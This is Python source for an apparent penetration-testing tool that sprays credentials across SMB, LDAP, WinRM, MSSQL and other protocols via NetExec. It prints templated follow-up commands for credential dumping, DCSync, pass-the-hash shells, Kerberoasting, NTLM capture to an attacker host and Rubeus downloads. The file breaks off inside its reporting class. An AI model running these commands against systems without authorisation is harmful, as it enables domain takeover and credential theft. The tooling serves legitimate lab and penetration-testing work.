#!/usr/bin/env python3
"""tomsploit — fast NetExec (nxc) triage across protocols and targets.

Sprays a credential set against every available protocol, confirms which
logins are valid, and prints the exact follow-up commands for each win.

Scope: enumeration only. It finds and reports access (and flags relay-able
hosts, DCs, anonymous access, and creds that are valid-but-unusable), but it
does not exploit, dump, or loot — it generates the commands for you to run.
Think of it as a careful nxc front-end with a context-aware command
generator, not a one-shot credential-attack-and-loot engine.

Architecture (single file on purpose — easy to scp onto a box mid-exam):

    Config           CLI args -> one settings object
    Models           AuthType, Cred, Success, TargetResult
    Parsing          nxc stdout -> structured data
    Suggestions      data-driven table: (auth, proto, dc) -> commands
    Reporter         everything that prints to the terminal
    TomSploit        scanning, subprocess control, progress, live output
    CLI              parse_args / build_config / main
"""
# MIT License — see LICENSE block at end of file.

import argparse
import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Iterable

# ─── Colors ────────────────────────────────────────────────────────────
RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
_COLOR_CODES = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
    "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
    "DIM": "\033[2m", "RESET": "\033[0m",
}


def configure_colors(no_color: bool) -> None:
    if no_color or not sys.stdout.isatty():
        return
    for name, code in _COLOR_CODES.items():
        globals()[name] = code


# ─── Protocol config ───────────────────────────────────────────────────
ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}

# Default TCP port per protocol for the pre-flight probe.
PROTOCOL_PORTS = {
    "smb": 445, "ssh": 22, "ldap": 389, "ftp": 21, "wmi": 135,
    "winrm": 5985, "rdp": 3389, "vnc": 5900, "mssql": 1433, "nfs": 2049,
}

# Which protocols accept hash / kerberos auth via nxc. (SSH is handled by
# the real ssh client, not nxc — see _scan_ssh — so it's password-only here.)
# Sending a hash to ftp/vnc/nfs makes nxc error, so those creds are skipped.
WINDOWS_PROTOS = {"smb", "winrm", "wmi", "rdp", "mssql", "ldap"}

DEFAULT_WORKERS = 15
NETEXEC_TIMEOUT = 30
SUBPROCESS_TIMEOUT = 45
PORT_PROBE_TIMEOUT = 2.0
MAX_CONSECUTIVE_TIMEOUTS = 3
BANNER_WIDTH = 60
DEFAULT_MAX_CIDR_HOSTS = 1024


class AuthType(str, Enum):
    PASSWORD = "password"
    HASH = "hash"
    KERBEROS = "kerberos"


# ─── Models ──────────────────────────────────────────────────────────────

@dataclass
class Config:
    """All settings derived from the CLI, shared by the scanner and the
    reporter so neither has to reach back into argparse."""
    targets: list[str]
    users: list[str]
    passwords: list[str]
    hashes: list[str]
    kerberos: bool
    protocols: list[str]
    log_file: str | None
    creds_file: str | None
    json_out: str | None
    workers: int
    quiet: bool
    verbose: bool
    debug: bool
    no_port_probe: bool
    paired: bool = False


@dataclass(frozen=True)
class Cred:
    """One (user, secret, auth_type) tuple to test."""
    user: str
    secret: str
    auth_type: AuthType

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS


@dataclass
class Success:
    """A successful nxc [+] auth result. May represent a real cred or a
    Samba guest-mapping pseudo-success (is_guest=True)."""
    protocol: str
    local_auth: bool
    domain: str
    user: str
    secret: str
    auth_type: AuthType
    is_admin: bool = False
    is_guest: bool = False
    raw_message: str = ""

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
    @property
    def scope(self) -> str: return "local" if self.local_auth else "domain"
    @property
    def label(self) -> str: return f"{self.protocol.upper()} ({self.scope})"

    @property
    def dedup_key(self) -> tuple:
        """Identity used to collapse duplicate [+] lines (nxc sometimes
        prints the same successful auth more than once, especially LDAP)."""
        return (self.protocol, self.local_auth, self.auth_type,
                self.domain.lower(), self.user.lower(), self.secret,
                self.is_guest)


@dataclass
class TargetResult:
    target: str
    real_ip: str = ""
    hostname: str = ""
    domain: str = ""        # AD domain from nxc info line (e.g. "DANTE.local")
    is_dc: bool = False
    smb_signing: bool | None = None   # None=unknown, True=required, False=relay-able
    elapsed: float = 0.0
    open_protocols: list[str] = field(default_factory=list)
    closed_protocols: list[str] = field(default_factory=list)
    successes: list[Success] = field(default_factory=list)   # real creds
    guests: list[Success] = field(default_factory=list)      # guest mappings
    anon_smb: bool = False
    anon_smb_lines: list[str] = field(default_factory=list)
    anon_ldap: bool = False
    anon_ldap_lines: list[str] = field(default_factory=list)
    anon_ldap_users: list[dict] = field(default_factory=list)  # [{user, description}, ...]
    protocol_lines: dict[str, list[tuple[str, str]]] = field(default_factory=dict)
    target_info: str = ""
    scanned: bool = True
    skipped_reason: str = ""
    # Pre-spray account-lockout read (anonymous nxc --pass-pol):
    lockout_threshold: int | None = None   # None=unknown, 0=disabled, N=threshold
    lockout_window: str = ""               # e.g. "30 minutes" (reset window)
    lockout_checked: bool = False


def success_sort_key(s: Success) -> tuple[int, int]:
    """Canonical protocol order, then domain before local. Used wherever
    successes are displayed so output is stable across runs."""
    try:
        return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
    except ValueError:
        return (len(ALL_PROTOCOLS), int(s.local_auth))


# ─── nxc output parsing ────────────────────────────────────────────────

def parse_nxc_line(line: str) -> tuple[str | None, str]:
    """Find the first nxc marker on a line; return (marker, message)."""
    for marker in ("[+]", "[-]", "[*]", "[!]"):
        idx = line.find(marker)
        if idx != -1:
            return marker, line[idx + 4:].strip()
    return None, line.strip()


def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
    """Parse an nxc [+] message into (domain, user, secret, is_admin, is_guest).

    Examples this handles:
        WORKGROUP\\admin:Password123                -> ('WORKGROUP','admin','Password123',False,False)
        DANTE.local\\katwamba:Diablo5679 (Pwn3d!)   -> (...,True,False)
        DANTE-NIX02\\admin:admin (Guest)            -> (...,False,True)
        WORKGROUP\\j:aad3b...:31d6cfe0... (Pwn3d!)   -> (...,True,False)
        admin:Password123                           -> ('','admin','Password123',False,False)
    """
    cleaned = msg.strip()
    is_admin = False
    is_guest = False

    # Strip a trailing parenthesised flag like (Pwn3d!), (adm), (Guest).
    m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
    if m:
        flag = m.group(1).lower()
        if "guest" in flag:
            is_guest = True
        elif "pwn3d" in flag or "adm" in flag:
            is_admin = True
        cleaned = cleaned[:m.start()].rstrip()

    if not cleaned or ":" not in cleaned:
        return "", cleaned, "", is_admin, is_guest

    head, secret = cleaned.split(":", 1)
    if "\\" in head:
        domain, user = head.split("\\", 1)
    else:
        domain, user = "", head
    return domain.strip(), user.strip(), secret, is_admin, is_guest


def is_auth_success(msg: str, user: str) -> bool:
    """True only if a [+] line really is a credential success for `user`.

    nxc's auth-success format is `DOMAIN\\user:secret [ (flag) ]`. Modules
    and status messages also use [+] (e.g. "[+] Dumped 5 objects"); without
    this guard those would be mis-parsed into bogus Success objects."""
    cleaned = re.sub(r"\s*\([^()]*\)\s*$", "", msg.strip())
    if ":" not in cleaned:
        return False
    head = cleaned.split(":", 1)[0]
    name = head.split("\\", 1)[1] if "\\" in head else head
    return name.strip().lower() == (user or "").strip().lower()


# Markers that an nxc [+] line is auth-related even when it doesn't parse as
# a clean success — used to decide whether to flag a line for manual review.
_PRIV_FLAG_RE = re.compile(r"\(\s*(pwn3d!?|adm(in)?)\s*\)", re.IGNORECASE)
_INFO_PLUS_RE = re.compile(
    # Common benign [+] module/status phrasings — NOT auth, don't flag these.
    r"\b(dumped|enumerat|found|saved|written|wrote|retrieved|obtained|"
    r"collected|added|created|deleted|executed|got \d|\d+ (object|user|"
    r"share|record|file|entry|entries|hash))",
    re.IGNORECASE)


def looks_like_possible_success(msg: str, user: str) -> bool:
    """True if a [+] line that FAILED the strict is_auth_success check still
    looks like it might be a real credential success we mis-parsed — so the
    reporter can flag it 'verify manually' rather than discard it.

    Conservative: only flags lines that either carry an explicit privilege
    marker like (Pwn3d!)/(adm), or contain the username next to a colon
    (credential-shaped) while clearly not matching a known benign module
    phrasing. Everything else is treated as ordinary informational output."""
    text = msg.strip()
    if not text:
        return False
    # Explicit privilege flags only ever appear on auth lines.
    if _PRIV_FLAG_RE.search(text):
        return True
    # Looks credential-shaped (has a colon) and mentions our username, but
    # didn't parse cleanly, and isn't an obvious module/status line.
    if ":" in text and user and user.lower() in text.lower():
        if not _INFO_PLUS_RE.search(text):
            return True
    return False


def extract_ipv4(text: str) -> str | None:
    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
    return m.group(0) if m else None


# Classify a [-] failure line so the report can hide the boring ones (wrong
# password) while always surfacing the meaningful ones. nxc emits all of
# these with a [-] marker, so without this they'd all look alike.
_ORDINARY_FAIL_RE = re.compile(
    r"STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|"
    r"authentication failed|login failed|invalid credentials",
    re.IGNORECASE)
_VALID_BUT_RE = re.compile(  # creds are actually CORRECT, with a caveat
    r"STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE|"
    r"STATUS_PASSWORD_CHANGE_REQUIRED|KDC_ERR_KEY_EXPIRED",
    re.IGNORECASE)
_ALERT_FAIL_RE = re.compile(  # stop-and-look failures
    r"STATUS_ACCOUNT_LOCKED_OUT|STATUS_ACCOUNT_DISABLED|"
    r"STATUS_ACCOUNT_RESTRICTION|STATUS_LOGON_TYPE_NOT_GRANTED|"
    r"STATUS_NOLOGON|STATUS_INVALID_LOGON_HOURS",
    re.IGNORECASE)


def classify_failure(msg: str) -> str:
    """Bucket a [-] message:
        'valid_but' — credential works but can't be used as-is (expired etc.)
        'alert'     — lockout / disabled / logon-not-permitted: change tactics
        'ordinary'  — plain wrong password: the screen-clogging noise
        'error'     — doesn't look like an auth response at all (conn refused,
                      executable-not-found, protocol/python error): always show
    Unknown lines fall through to 'error' deliberately — better to show an
    odd line once than to silently swallow a real problem."""
    if _VALID_BUT_RE.search(msg):
        return "valid_but"
    if _ALERT_FAIL_RE.search(msg):
        return "alert"
    if _ORDINARY_FAIL_RE.search(msg):
        return "ordinary"
    return "error"


def _dc_name_hint(target_info: str) -> bool:
    """Weak signal: does the hostname look like a DC? Used only as a
    tiebreaker — many real DCs are not named conventionally, and names like
    DEVDC / DCLIENT false-positive, so this never decides on its own."""
    if not target_info:
        return False
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    if not m:
        return False
    hostname = m.group(1).lower()
    # Require the "dc" token to be its own word or a numbered DC (DC, DC01,
    # PDC, ADDC) — not merely a prefix, so DCLIENT / DEVDC don't match.
    return bool(re.search(r"(^|[^a-z])(p?dc|addc)\d*([^a-z]|$)", hostname))


def detect_dc(target_info: str, ldap_open: bool, ldap_info: str = "",
              role_flag: bool = False) -> bool:
    """Signal-based DC detection, strongest signal first:

      1. nxc explicitly flags the DC role in its output  -> definite.
      2. LDAP service is reachable AND an AD domain is present -> a DC.
         Member servers and workstations don't answer LDAP on 389/636;
         only Domain Controllers do, so a working LDAP bind plus a real
         (non-WORKGROUP) domain is the reliable tell.
      3. Otherwise fall back to the hostname hint (tiebreaker only).

    `ldap_info` is nxc's LDAP [*] line if we got one (its mere existence is
    strong evidence LDAP answered). `role_flag` is set if any nxc line
    contained an explicit DC role marker."""
    if role_flag:
        return True

    domain = extract_domain(target_info) or extract_domain(ldap_info)
    has_ad_domain = bool(domain) and domain.upper() != "WORKGROUP"

    # LDAP answered (port open, or we actually got an LDAP info line back).
    ldap_answered = ldap_open or bool(ldap_info)
    if ldap_answered and has_ad_domain:
        return True

    # Weak fallback: conventional DC name. Require an AD domain too, so a
    # stray "dc" in a workgroup machine's name doesn't trip it.
    if has_ad_domain and _dc_name_hint(target_info):
        return True
    return False


# nxc occasionally tags the DC role explicitly in its banner/info output;
# match the common spellings without over-fitting.
_DC_ROLE_RE = re.compile(
    r"\b(domain controller|\(DC\)|is a? ?dc\b|primary domain controller)\b",
    re.IGNORECASE)


def line_flags_dc_role(msg: str) -> bool:
    return bool(_DC_ROLE_RE.search(msg))


def extract_hostname(target_info: str) -> str:
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1).upper() if m else ""


def extract_domain(target_info: str) -> str:
    """Pull the AD domain from nxc's [*] info line (e.g. 'domain:DANTE.local')."""
    m = re.search(r"domain:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1) if m else ""


def extract_smb_signing(target_info: str) -> bool | None:
    """Read SMB signing state from nxc's SMB info line '(signing:True/False)'.
    Returns True (required), False (not required → relay-able), or None
    (not present in the line we parsed)."""
    m = re.search(r"signing:\s*(True|False)", target_info, re.IGNORECASE)
    if not m:
        return None
    return m.group(1).lower() == "true"


# ─── Suggestion engine ─────────────────────────────────────────────────
# A success becomes a list of (label, command) follow-ups by matching it
# against SUGGEST_RULES. Every value substituted into a template passes
# through shlex.quote() first, so secrets with spaces/quotes/$ paste safely.
#
# Rationale for what is / isn't suggested (OSCP-flavoured):
#   * One share enumerator (nxc --shares already shows r/w perms) to avoid
#     the smbmap-vs-nxc duplication.
#   * `--rid-brute` is offered everywhere it works — it pulls users over
#     SMB even when LDAP is closed, which is common on member servers.
#   * AD enumeration lives in the LDAP block; secretsdump lives in the SMB
#     block — so a host where both succeed doesn't print either twice.
#   * BloodHound has a fallback (nxc's own collector + ldapdomaindump +
#     individual nxc attack-path flags) for when bloodhound-python chokes
#     on DNS/clock skew, which it frequently does in labs.

def q(v: str | None) -> str:
    """shlex.quote with sane handling of None/empty."""
    if v is None or v == "":
        return "''"
    return shlex.quote(str(v))


@dataclass(frozen=True)
class SuggestRule:
    """commands is a tuple of (label, template). A template is a PLAIN
    string (never an f-string) using {placeholders} filled from the context
    built in build_context(); it may contain newlines for multi-line notes.
    dc: None = any host, True = DC only, False = non-DC only."""
    auth: AuthType
    proto: str
    commands: tuple[tuple[str, str], ...]
    dc: bool | None = None


SUGGEST_RULES: list[SuggestRule] = [

    # ── PASSWORD · SMB ──────────────────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "smb", dc=False, commands=(
        ("list shares + perms",
            "nxc smb {qip} -u {quser} -p {qpw} --shares"),
        ("spider shares + download readable files",
            "nxc smb {qip} -u {quser} -p {qpw} -M spider_plus -o DOWNLOAD_FLAG=true\n"
            "# inventory + loot saved under ~/.nxc/modules/nxc_spider_plus/<ip>.json"),
        ("interactive share browse",
            "smbclient //{ip}/<SHARE> -U {smb_user}"),
        ("enumerate users via SAMR (RID brute)",
            "nxc smb {qip} -u {quser} -p {qpw} --rid-brute"),
        ("full SMB/RPC enum",
            "enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
        ("dump SAM + LSA + cached creds (needs local admin)",
            "impacket-secretsdump {url_pw}"),
        ("SYSTEM shell (needs local admin)",
            "impacket-psexec {url_pw}"),
        ("exec fallbacks (if psexec fails)",
            "impacket-wmiexec {url_pw}\nimpacket-smbexec {url_pw}"),
    )),
    SuggestRule(AuthType.PASSWORD, "smb", dc=True, commands=(
        ("list shares + perms",
            "nxc smb {qip} -u {quser} -p {qpw} --shares"),
        ("enumerate users via SAMR (RID brute)",
            "nxc smb {qip} -u {quser} -p {qpw} --rid-brute"),
        ("password policy (avoid lockout)",
            "nxc smb {qip} -u {quser} -p {qpw} --pass-pol"),
        ("GPP cpasswords in SYSVOL",
            "nxc smb {qip} -u {quser} -p {qpw} -M gpp_password"),
        ("DCSync the domain",
            "impacket-secretsdump -just-dc {url_pw}\n"
            "# on-target alt:  mimikatz \"lsadump::dcsync /domain:{dom_plain} /user:krbtgt\""),
        ("browse SYSVOL / scripts",
            "smbclient //{ip}/SYSVOL -U {smb_user}"),
    )),

    # ── PASSWORD · LDAP ─────────────────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
        ("Kerberoast — SPN tickets (from Kali)",
            "impacket-GetUserSPNs -request -dc-ip {qip} "
            "{qdom}/{quser}:{qpw} -outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast — on the target if impacket fails (Rubeus)",
            "# upload first:  iwr http://$LHOST/Rubeus.exe -o Rubeus.exe   ($LHOST = your VPN IP)\n"
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash"),
        ("AS-REP roast — preauth-disabled users (from Kali)",
            "impacket-GetNPUsers {qdom}/{quser}:{qpw} -request "
            "-format hashcat -outputfile asrep.hash -dc-ip {qip}\n"
            "# crack:  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"),
        ("AS-REP roast — on the target (Rubeus)",
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound (primary collector)",
            "bloodhound-python -u {quser} -p {qpw} -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip"),
        ("BloodHound fallback (nxc collector)",
            "nxc ldap {qip} -u {quser} -p {qpw} --bloodhound -c All "
            "--dns-server {qip}"),
        ("attack-path checks",
            "nxc ldap {qip} -u {quser} -p {qpw} --password-not-required\n"
            "nxc ldap {qip} -u {quser} -p {qpw} --trusted-for-delegation\n"
            "nxc ldap {qip} -u {quser} -p {qpw} --admin-count"),
        ("offline AD dump (no BloodHound)",
            "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
        ("enumerate more usernames (kerbrute)",
            "kerbrute userenum --dc {qip} -d {qdom} "
            "/usr/share/seclists/Usernames/Names/names.txt"),
    )),
    SuggestRule(AuthType.PASSWORD, "ldap", dc=False, commands=(
        ("offline directory dump",
            "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
    )),

    # ── PASSWORD · other Windows protocols ──────────────────────────
    SuggestRule(AuthType.PASSWORD, "winrm", commands=(
        ("interactive shell",
            "evil-winrm -i {qip} -u {quser} -p {qpw}"),
        ("confirm exec without a full shell",
            "nxc winrm {qip} -u {quser} -p {qpw} -x whoami"),
    )),
    SuggestRule(AuthType.PASSWORD, "wmi", commands=(
        ("semi-interactive shell",
            "impacket-wmiexec {url_pw}"),
        ("quick command exec",
            "nxc wmi {qip} -u {quser} -p {qpw} -x whoami"),
    )),
    SuggestRule(AuthType.PASSWORD, "rdp", commands=(
        ("RDP session (+ share mount for transfers)",
            "xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
            "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
        ("screenshot the desktop",
            "nxc rdp {qip} -u {quser} -p {qpw} --screenshot"),
    )),
    SuggestRule(AuthType.PASSWORD, "mssql", commands=(
        ("SQL client",
            "impacket-mssqlclient {url_pw} {mssql_authflag}"),
        ("xp_cmdshell (in the mssqlclient prompt)",
            "enable_xp_cmdshell;\nxp_cmdshell whoami;"),
        ("OS command via nxc",
            "nxc mssql {qip} -u {quser} -p {qpw} -x whoami"),
        ("capture NetNTLM via xp_dirtree (start responder first)",
            "EXEC master..xp_dirtree '\\\\$LHOST\\share';"),
    )),

    # ── PASSWORD · *nix protocols ───────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "ssh", commands=(
        ("shell (no host-key prompts)",
            "ssh -o UserKnownHostsFile=/dev/null "
            "-o StrictHostKeyChecking=no {user_ssh}"),
        ("after login — quick local enum",
            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null\n"
            "# then upload + run linpeas for the full pass"),
    )),
    SuggestRule(AuthType.PASSWORD, "ftp", commands=(
        ("interactive (active mode)",
            "ftp -A {qip}"),
        ("recursive pull",
            "wget -r {ftp_url}"),
    )),
    SuggestRule(AuthType.PASSWORD, "vnc", commands=(
        ("connect",
            "vncviewer {qip}"),
    )),
    SuggestRule(AuthType.PASSWORD, "nfs", commands=(
        ("list exports",
            "showmount -e {qip}"),
        ("mount an export",
            "sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o nolock,vers=3 "
            "{ip}:<EXPORT> /mnt/nfs"),
        ("no_root_squash priv-esc note",
            "# if the export allows root write, drop a SUID-root binary "
            "on it and execute it on the target"),
    )),

    # ── HASH (Pass-the-Hash) ────────────────────────────────────────
    SuggestRule(AuthType.HASH, "smb", dc=False, commands=(
        ("list shares + perms [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --shares"),
        ("spider shares + download readable files [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M spider_plus -o DOWNLOAD_FLAG=true\n"
            "# inventory + loot saved under ~/.nxc/modules/nxc_spider_plus/<ip>.json"),
        ("interactive share browse [PtH]",
            "impacket-smbclient {url_nopw} -hashes :{nthash}"),
        ("enumerate users via SAMR [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --rid-brute"),
        ("dump SAM + LSA (needs local admin) [PtH]",
            "impacket-secretsdump {url_nopw} -hashes :{nthash}"),
        ("SYSTEM shell (needs local admin) [PtH]",
            "impacket-psexec {url_nopw} -hashes :{nthash}"),
        ("exec fallbacks [PtH]",
            "impacket-wmiexec {url_nopw} -hashes :{nthash}\n"
            "impacket-smbexec {url_nopw} -hashes :{nthash}"),
    )),
    SuggestRule(AuthType.HASH, "smb", dc=True, commands=(
        ("list shares + perms [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --shares"),
        ("enumerate users via SAMR [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --rid-brute"),
        ("DCSync the domain [PtH]",
            "impacket-secretsdump -just-dc {url_nopw} -hashes :{nthash}\n"
            "# on-target alt:  mimikatz \"lsadump::dcsync /domain:{dom_plain} /user:krbtgt\""),
        ("SYSTEM shell [PtH]",
            "impacket-psexec {url_nopw} -hashes :{nthash}"),
        ("GPP cpasswords in SYSVOL [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M gpp_password"),
    )),
    SuggestRule(AuthType.HASH, "winrm", commands=(
        ("interactive shell [PtH]",
            "evil-winrm -i {qip} -u {quser} -H {qhash}"),
    )),
    SuggestRule(AuthType.HASH, "wmi", commands=(
        ("semi-interactive shell [PtH]",
            "impacket-wmiexec {url_nopw} -hashes :{nthash}"),
        ("quick command exec [PtH]",
            "nxc wmi {qip} -u {quser} -H {qhash} -x whoami"),
    )),
    SuggestRule(AuthType.HASH, "rdp", commands=(
        ("RDP session [PtH]",
            "xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
            "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
        ("screenshot the desktop [PtH]",
            "nxc rdp {qip} -u {quser} -H {qhash} --screenshot"),
    )),
    SuggestRule(AuthType.HASH, "mssql", commands=(
        ("SQL client [PtH]",
            "impacket-mssqlclient {url_nopw} -hashes :{nthash} {mssql_authflag}"),
        ("OS command via nxc [PtH]",
            "nxc mssql {qip} -u {quser} -H {qhash} -x whoami"),
    )),
    SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
        ("Kerberoast [PtH, from Kali]",
            "impacket-GetUserSPNs -request -dc-ip {qip} -hashes :{nthash} "
            "{qdom}/{quser} -outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("AS-REP roast [PtH, from Kali]",
            "impacket-GetNPUsers {qdom}/{quser} -hashes :{nthash} -request "
            "-format hashcat -outputfile asrep.hash -dc-ip {qip}\n"
            "# crack:  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast / AS-REP on the target if impacket fails (Rubeus)",
            "# upload first:  iwr http://$LHOST/Rubeus.exe -o Rubeus.exe   ($LHOST = your VPN IP)\n"
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash\n"
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound [PtH]",
            "bloodhound-python -u {quser} --hashes :{nthash} -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip"),
        ("BloodHound fallback (nxc collector) [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --bloodhound -c All "
            "--dns-server {qip}"),
        ("attack-path checks [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --password-not-required\n"
            "nxc ldap {qip} -u {quser} -H {qhash} --trusted-for-delegation\n"
            "nxc ldap {qip} -u {quser} -H {qhash} --admin-count"),
    )),
    SuggestRule(AuthType.HASH, "ldap", dc=False, commands=(
        ("request a TGT (then use with -k)",
            "impacket-getTGT {qdom}/{quser} -hashes :{nthash}"),
    )),

    # ── KERBEROS (ticket cache) ─────────────────────────────────────
    SuggestRule(AuthType.KERBEROS, "smb", commands=(
        ("SYSTEM shell -k",
            "impacket-psexec -k -no-pass {url_nopw}"),
    )),
    SuggestRule(AuthType.KERBEROS, "smb", dc=True, commands=(
        ("DCSync the domain -k",
            "impacket-secretsdump -just-dc -k -no-pass {url_nopw}"),
    )),
    SuggestRule(AuthType.KERBEROS, "winrm", commands=(
        ("interactive shell -r",
            "evil-winrm -i {qip} -u {quser} -r {qdom}"),
    )),
    SuggestRule(AuthType.KERBEROS, "ldap", dc=True, commands=(
        ("Kerberoast -k",
            "impacket-GetUserSPNs -k -no-pass -dc-ip {qip} {qdom}/ "
            "-outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast / AS-REP on the target (Rubeus, uses current ticket)",
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash\n"
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound -k",
            "bloodhound-python -u {quser} -k --no-pass -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip"),
        ("BloodHound fallback (nxc collector) -k",
            "nxc ldap {qip} -u {quser} -k --bloodhound -c All "
            "--dns-server {qip}"),
    )),
]


def build_context(s: Success, ip: str, hostname: str, is_dc: bool) -> dict[str, str]:
    """Pre-quote every value a template might substitute. Raw `ip` is the
    only un-quoted entry and is only used inside //ip/ and ip:export paths
    (an IP/hostname is shell-safe)."""
    user = s.user or ""
    domain = s.domain or ""
    secret = s.secret or ""
    pth_hash = secret if s.is_hash else ""   # PtH templates only fire for HASH
    # secretsdump prints hashes as LMHASH:NTHASH. impacket -hashes wants the NT
    # half (':{nthash}'), so collapse a full pair down to the NT hash; an
    # NT-only hash passes through unchanged.
    nt_only = pth_hash
    if pth_hash and ":" in pth_hash:
        parts = pth_hash.split(":")
        if len(parts) == 2 and all(re.fullmatch(r"[0-9a-fA-F]{32}", p) for p in parts):
            nt_only = parts[1]

    if domain:
        url_pw = f"{domain}/{user}:{secret}@{ip}"
        url_nopw = f"{domain}/{user}@{ip}"
    else:
        url_pw = f"{user}:{secret}@{ip}"
        url_nopw = f"{user}@{ip}"

    if domain and not s.is_hash:
        smb_user = f"{domain}\\{user}%{secret}"
    elif not s.is_hash:
        smb_user = f"{user}%{secret}"
    else:
        smb_user = f"{domain}\\{user}" if domain else user

    ldap_user = (domain + "\\" + user) if domain else user

    return {
        "ip": ip,
        "qip": q(ip),
        "quser": q(user),
        "qpw": q(secret) if not s.is_hash else "''",
        "qdom": q(domain) if domain else "''",
        "qhash": q(pth_hash) if pth_hash else "''",
        "nthash": q(nt_only) if nt_only else "NT",
        "url_pw": q(url_pw),
        "url_nopw": q(url_nopw),
        "host": q(hostname or ip),
        "fqdn": q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip)),
        "smb_user": q(smb_user),
        "ldap_user": q(ldap_user),
        "user_ssh": q(f"{user}@{ip}"),
        "ftp_url": q(f"ftp://{user}:{secret}@{ip}/"),
        "dom_plain": domain or "<DOMAIN>",
        "mssql_authflag": "" if s.local_auth else "-windows-auth",
    }


def _inject_local_auth(cmd: str) -> str:
    """A local (non-domain) credential needs --local-auth on every nxc
    command, or nxc attempts DOMAIN auth against the machine name and fails.
    impacket commands handle local auth via the machine-name 'domain', so we
    only touch nxc lines. Idempotent; leaves '#' note lines untouched."""
    lines = cmd.split("\n")
    for i, ln in enumerate(lines):
        if ln.strip().startswith("nxc ") and "--local-auth" not in ln:
            lines[i] = ln.rstrip() + " --local-auth"
    return "\n".join(lines)


def build_suggestions(s: Success, ip: str, hostname: str,
                      is_dc: bool) -> list[tuple[str, str]]:
    """Return [(label, command), ...] follow-ups for a success.

    Never raises — a malformed template is skipped rather than allowed to
    break the whole report."""
    try:
        ctx = build_context(s, ip, hostname, is_dc)
    except Exception:
        return []
    out: list[tuple[str, str]] = []
    for rule in SUGGEST_RULES:
        if rule.auth != s.auth_type or rule.proto != s.protocol:
            continue
        if rule.dc is not None and rule.dc != is_dc:
            continue
        for label, template in rule.commands:
            try:
                cmd = template.format(**ctx)
            except Exception:
                continue
            if s.local_auth:
                cmd = _inject_local_auth(cmd)
            out.append((label, cmd))
    return out


# ─── Anonymous-access command references ────────────────────────────────

ANON_SMB_COMMANDS = [
    ("list shares (smbclient)",       "smbclient -L //{ip} -N"),
    ("list shares (nxc)",             "nxc smb {ip} -u '' -p '' --shares"),
    ("enumerate users (RID brute)",   "nxc smb {ip} -u '' -p '' --rid-brute"),
    ("password policy",               "nxc smb {ip} -u '' -p '' --pass-pol"),
    ("connect to a share",            "smbclient //{ip}/<SHARE> -N"),
    ("recursive pull a share",        "smbclient //{ip}/<SHARE> -N -c 'recurse ON; prompt OFF; mget *'"),
    ("full RPC enum",                 "enum4linux-ng -A {ip}"),
]


# ─── Reporter (all terminal output) ─────────────────────────────────────

class Reporter:
    """Renders results. The scanner produces data; everything that touches
